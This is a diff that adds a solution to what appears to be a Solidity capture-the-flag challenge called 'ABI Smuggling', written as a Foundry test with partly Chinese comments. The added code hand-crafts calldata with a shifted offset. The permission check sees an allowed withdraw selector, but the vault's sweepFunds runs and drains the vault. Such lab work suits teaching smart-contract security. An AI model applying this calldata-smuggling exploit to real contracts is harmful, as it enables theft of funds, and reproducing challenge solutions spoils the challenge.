@@ -73,7 +73,61 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // Selectors for AuthorizedExecutor.sol
+        console.log("AuthorizedExecutor.setPermissions(bytes32[]):");
+        console.logBytes4(bytes4(keccak256("setPermissions(bytes32[])")));
+        console.log("AuthorizedExecutor.execute(address,bytes):");
+        console.logBytes4(bytes4(keccak256("execute(address,bytes)")));
+        console.log("AuthorizedExecutor.getActionId(bytes4,address,address):");
+        console.logBytes4(bytes4(keccak256("getActionId(bytes4,address,address)")));
+
+        // Selectors for SelfAuthorizedVault.sol
+        console.log("SelfAuthorizedVault.withdraw(address,address,uint256):");
+        console.logBytes4(bytes4(keccak256("withdraw(address,address,uint256)")));
+        console.log("SelfAuthorizedVault.sweepFunds(address,address):"); // IERC20 is treated as address
+        console.logBytes4(bytes4(keccak256("sweepFunds(address,address)")));
+        console.log("SelfAuthorizedVault.getLastWithdrawalTimestamp():");
+        console.logBytes4(bytes4(keccak256("getLastWithdrawalTimestamp()")));
+
+        // --- 手动构造calldata并执行低级调用 ---
+
+        // 1. 获取 withdraw(address token, address recipient, uint256 amount) 
+        // 和 sweepFunds(address receiver, IERC20 token) 的函数选择器
+        bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,address,uint256)"));
+        bytes4 sweepFundsSelector = bytes4(keccak256("sweepFunds(address,address)"));
+
+        // 2. 准备 withdraw和sweepFunds 函数的参数
+        address tokenAddress = address(token);
+        address recipientAddress = recovery; // 使用之前定义的 recovery 地址
+        uint256 amount = 1 ether; // WITHDRAWAL_LIMIT
+
+        // 3. 手动ABI编码 actionData (即 withdraw和sweepFunds 函数的 calldata)
+        bytes memory withdrawActionData = abi.encodePacked(withdrawSelector, abi.encode(tokenAddress, recipientAddress, amount));
+        bytes memory sweepFundsActionData = abi.encodePacked(sweepFundsSelector, abi.encode(recipientAddress, tokenAddress));
+
+        // 4. 获取 execute(address,bytes) 的函数选择器
+        bytes4 executeSelector = bytes4(keccak256("execute(address,bytes)"));
+
+        // 5. 准备 execute 函数的参数
+        address targetVault = address(vault);
+
+        bytes memory finalCalldata = abi.encodePacked(
+            executeSelector,
+            bytes32(uint256(uint160(targetVault))),
+            bytes32(uint256(0xc4)), // 0x40 + 100 + 32
+            bytes32(uint256(withdrawActionData.length)),
+            withdrawActionData,
+            bytes32(uint256(sweepFundsActionData.length)),
+            sweepFundsActionData
+        );
+        console.log("actionData.length:", withdrawActionData.length); // 100
+        console.log("actionData.length:", sweepFundsActionData.length); // 68
+
+        // 7. 执行低级调用
+        // We need to ensure the call is made from the `player` context for permissions.
+        // The `checkSolvedByPlayer` modifier already handles vm.startPrank(player, player).
+        (bool success, bytes memory returnData) = address(vault).call(finalCalldata);
+        require(success, "Low-level call to execute failed");
     }
 
     /**
